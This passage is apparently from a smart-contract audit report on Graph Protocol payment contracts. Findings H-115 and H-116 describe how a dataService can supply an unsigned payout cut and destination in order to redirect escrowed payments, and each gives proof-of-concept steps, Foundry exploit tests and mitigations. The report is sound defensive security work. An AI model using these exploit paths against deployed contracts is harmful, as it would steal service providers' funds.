        curation.setReturns({burnReturn_: 600 ether, mintReturn_: manipulatedNewVSignal});

        vm.prank(owner);
        gns.publishNewVersion(subgraphID, keccak256("new"));

        (bytes32 deployment, uint256 vSignal, uint256 nSignal) = gns.subgraphs(subgraphID);
        assertEq(deployment, keccak256("new"));
        assertEq(nSignal, 1000 ether, "name signal supply is unchanged");
        assertEq(vSignal, manipulatedNewVSignal, "backing vSignal accepted with no minimum");
        assertGt(fairNewVSignal - vSignal, 0, "curator backing was degraded by zero-slippage execution");
    }
}


## Suggested Mitigation
Change `publishNewVersion()` to accept minimum acceptable values for both legs, for example `_tokensOutMin` for the old deployment burn and `_vSignalOutMin` for the new deployment mint, and revert if either bound is not met. Add a deadline to prevent stale owner transactions from being executed after market conditions change. If the protocol wants to protect non-owner curators, consider a timelocked or opt-in migration flow for upgrades with large existing signal.
```

### H-115 / `ehVpD-cV2madnpbmgU4kx`
- Finding title: RAV signatures omit payment parameters allowing data service to redirect or skim collections
- Report lines: 10763-10893
```md
## [H-115]. RAV signatures omit payment parameters allowing data service to redirect or skim collections

## id: ehVpD-cV2madnpbmgU4kx

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: The combined root cause is directly present. _collect decodes dataServiceCut and receiverDestination from caller-controlled calldata, receives paymentType as an external argument, and forwards all three to PaymentsEscrow.collect. The signed RAV hash covers only collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. The collector checks msg.sender equals rav.dataService, the signer is authorized for the payer, and the serviceProvider has an active provision with that dataService, but none of those checks authenticates paymentType, dataServiceCut, or receiverDestination. PPMMath is imported, yet GraphTallyCollector does not validate dataServiceCut before forwarding it. The provided comments define dataServiceCut and receiverDestination as payment collection parameters, making them payment-affecting in this code path. The in-scope production contract contains no full safeguard binding these parameters to the RAV or requiring separate service-provider authorization. This is not explicitly documented as accepted protocol behavior. A dataService named in a valid RAV can exercise the path now, without governance/admin compromise or mere victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The signed EIP-712 ReceiptAggregateVoucher only commits to collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. However collect() decodes paymentType, dataServiceCut, and receiverDestination from caller-controlled calldata and forwards them to PaymentsEscrow without requiring them to be signed or otherwise authorized by the payer or service provider. Vulnerable flow: `abi.decode(_data, (SignedRAV, uint256, address))` accepts `dataServiceCut` and `receiverDestination`; `_encodeRAV()` hashes only the RAV fields; then `_graphPaymentsEscrow().collect(_paymentType, payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination)` executes with the unsigned parameters. A valid rav.dataService caller can therefore take a legitimate RAV for a serviceProvider and choose a 100% cut, alternate paymentType, or attacker-controlled receiverDestination at execution time, depending on escrow semantics.

## Impact
A data service with any valid high-value RAV can cause escrowed payer funds to be settled with attacker-chosen payout parameters, stealing or misdirecting service-provider payment value directly from protocol escrow.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer -> serviceProvider with dataService and valueAggregate. 3. The RAV does not include dataServiceCut, receiverDestination, or paymentType. 4. The dataService submits collect() with the valid signed RAV but sets dataServiceCut to 1_000_000 and receiverDestination to an attacker address. 5. GraphTallyCollector accepts the signature because only RAV fields are checked, increments tokensCollected, and calls PaymentsEscrow.collect with the attacker-selected parameters.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

contract MockController {
    address public staking;
    address public escrow;
    constructor(address s, address e) { staking = s; escrow = e; }
    function getContractProxy(bytes32 name) external view returns (address) {
        if (name == keccak256(bytes("Staking"))) return staking;
        if (name == keccak256(bytes("PaymentsEscrow"))) return escrow;
        return address(0xBEEF);
    }
}

contract MockStaking {
    function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; }
}

contract MockEscrow {
    address public lastPayer;
    address public lastReceiver;
    address public lastDataService;
    uint256 public lastAmount;
    uint256 public lastDataServiceCut;
    address public lastReceiverDestination;
    function collect(
        IGraphPayments.PaymentTypes,
        address payer,
        address receiver,
        uint256 amount,
        address dataService,
        uint256 dataServiceCut,
        address receiverDestination
    ) external {
        lastPayer = payer;
        lastReceiver = receiver;
        lastAmount = amount;
        lastDataService = dataService;
        lastDataServiceCut = dataServiceCut;
        lastReceiverDestination = receiverDestination;
    }
}

contract GraphTallyCollectorUnsignedParamsTest is Test {
    function testDataServiceCanChooseUnsignedCutAndDestination() public {
        uint256 signerPk = 0xA11CE;
        address signer = vm.addr(signerPk);
        address payer = address(0x1001);
        address serviceProvider = address(0x2002);
        address dataService = address(0x3003);
        address attackerDestination = address(0x4444);

        MockStaking staking = new MockStaking();
        MockEscrow escrow = new MockEscrow();
        MockController controller = new MockController(address(staking), address(escrow));
        GraphTallyCollector collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 7 days);

        uint256 deadline = block.timestamp + 1 days;
        bytes32 authHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer));
        bytes32 authDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", authHash));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(signerPk, authDigest);
        vm.prank(payer);
        collector.authorizeSigner(signer, deadline, abi.encodePacked(ar, as_, av));

        IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: bytes32("collection"),
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: dataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(1_000_000 ether),
            metadata: ""
        });
        bytes32 ravDigest = collector.encodeRAV(rav);
        (uint8 rv, bytes32 rr, bytes32 rs) = vm.sign(signerPk, ravDigest);
        IGraphTallyCollector.SignedRAV memory signedRAV = IGraphTallyCollector.SignedRAV({
            rav: rav,
            signature: abi.encodePacked(rr, rs, rv)
        });

        bytes memory data = abi.encode(signedRAV, uint256(1_000_000), attackerDestination);
        vm.prank(dataService);
        collector.collect(IGraphPayments.PaymentTypes(0), data);

        assertEq(escrow.lastPayer(), payer);
        assertEq(escrow.lastReceiver(), serviceProvider);
        assertEq(escrow.lastDataService(), dataService);
        assertEq(escrow.lastAmount(), 1_000_000 ether);
        assertEq(escrow.lastDataServiceCut(), 1_000_000);
        assertEq(escrow.lastReceiverDestination(), attackerDestination);
    }
}

## Suggested Mitigation
Bind all payment-affecting parameters to the signed authorization. Add paymentType, dataServiceCut, and receiverDestination to the EIP712 RAV typehash, or require an independent service-provider authorization for dataServiceCut and receiverDestination. Also validate dataServiceCut <= 1_000_000 in GraphTallyCollector before calling escrow.
```

### H-116 / `VQKcGszzCjO6o-P5XLfDl`
- Finding title: Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts
- Report lines: 10894-10945
```md
## [H-116]. Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts

## id: VQKcGszzCjO6o-P5XLfDl

## Derived From Pattern/Invariant
UnsafeRecipient / AccessControlOrAuthByPass: receiver payout destination must be authorized by the signed serviceProvider

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: This is the same receiverDestination authorization issue expressed at _collect level, and the vulnerable path is present. _collect decodes receiverDestination from _data supplied by the caller and forwards it to _graphPaymentsEscrow().collect while setting receiver to signedRAV.rav.serviceProvider. _encodeRAV omits receiverDestination, so a valid RAV binds the serviceProvider identity but not the destination where the receiver side is sent. The only caller restriction is that msg.sender must equal rav.dataService, plus signer authorization and active provision checks; none fully prevents the dataService from choosing an arbitrary receiverDestination. tokensCollected is then incremented for the honest serviceProvider/payer tuple before the escrow call, consuming the aggregate. GraphTallyCollector is listed in the audit scope. There is no exact documentation saying the protocol intentionally lets the dataService redirect receiver payouts without provider authorization. The exploit path exists in current code and does not depend on a future upgrade, privileged administrator, compromised credential, or a pure user mistake without a protocol flaw.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The RAV signature binds collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata, but it does not bind the payout destination. _collect decodes receiverDestination directly from caller-controlled calldata and forwards it to escrow: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. Because msg.sender only needs to equal signedRAV.rav.dataService, a malicious or compromised dataService can submit a valid RAV naming an honest serviceProvider while replacing receiverDestination with an attacker address. tokensCollected is then incremented for the honest serviceProvider tuple, consuming the collectible aggregate while escrow is instructed to pay elsewhere.

## Impact
A dataService can steal serviceProvider payments from PaymentsEscrow and permanently consume the signed aggregate for the honest provider, causing direct loss of escrowed GRT and preventing later legitimate collection for the same RAV amount.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer, honest serviceProvider, and attacker-controlled dataService. The signed RAV does not include receiverDestination. 3. The attacker calls collect as the RAV dataService and ABI-encodes receiverDestination = attacker. 4. GraphTallyCollector verifies the RAV, increments tokensCollected[dataService][collectionId][serviceProvider][payer], and calls PaymentsEscrow.collect with receiver = serviceProvider but receiverDestination = attacker. 5. Escrow pays the attacker-controlled destination while the serviceProvider's collectible aggregate is consumed.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";

contract MockController { mapping(bytes32 => address) public proxies; function set(bytes memory name, address value) external { proxies[keccak256(name)] = value; } function getContractProxy(bytes32 name) external view returns (address) { return proxies[name]; } }
contract MockStaking { function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; } }
contract MockEscrow { address public lastReceiverDestination; mapping(address => uint256) public paid; function collect(IGraphPayments.PaymentTypes, address, address, uint256 tokens, address, uint256, address receiverDestination) external { lastReceiverDestination = receiverDestination; paid[receiverDestination] += tokens; } }

contract GraphTallyCollectorRedirectTest is Test {
    GraphTallyCollector collector; MockEscrow escrow; uint256 signerPk = 0xA11CE; address signer; address payer = address(0x1001); address provider = address(0x2002); address dataService = address(0x3003); address attacker = address(0x4444);
    function setUp() public { MockController controller = new MockController(); MockStaking staking = new MockStaking(); escrow = new MockEscrow(); address dummy = address(0xBEEF); controller.set(bytes("GraphToken"), dummy); controller.set(bytes("Staking"), address(staking)); controller.set(bytes("GraphPayments"), dummy); controller.set(bytes("PaymentsEscrow"), address(escrow)); controller.set(bytes("EpochManager"), dummy); controller.set(bytes("RewardsManager"), dummy); controller.set(bytes("GraphTokenGateway"), dummy); controller.set(bytes("GraphProxyAdmin"), dummy); controller.set(bytes("Curation"), dummy); collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 1 days); signer = vm.addr(signerPk); uint256 deadline = block.timestamp + 1 days; bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer)); bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); vm.prank(payer); collector.authorizeSigner(signer, deadline, abi.encodePacked(r, s, v)); }
    function signedRAV(bytes32 cid, uint128 amount) internal returns (IGraphTallyCollector.SignedRAV memory sr) { IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({collectionId: cid, payer: payer, serviceProvider: provider, dataService: dataService, timestampNs: uint64(block.timestamp), valueAggregate: amount, metadata: bytes("")}); bytes32 digest = collector.encodeRAV(rav); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); sr = IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)}); }
    function test_unsignedReceiverDestinationRedirectsPayout() public { bytes32 cid = keccak256("cid"); IGraphTallyCollector.SignedRAV memory sr = signedRAV(cid, 100 ether); bytes memory data = abi.encode(sr, uint256(0), attacker); vm.prank(dataService); uint256 collected = collector.collect(IGraphPayments.PaymentTypes(0), data, 0); assertEq(collected, 100 ether); assertEq(escrow.lastReceiverDestination(), attacker); assertEq(escrow.paid(attacker), 100 ether); assertEq(escrow.paid(provider), 0); assertEq(collector.tokensCollected(dataService, cid, provider, payer), 100 ether); }
}

## Suggested Mitigation
Bind receiverDestination in the signed RAV, or require receiverDestination == signedRAV.rav.serviceProvider unless the serviceProvider has separately authorized the destination on-chain or in an included signature field. Perform this validation before incrementing tokensCollected or calling escrow.
```
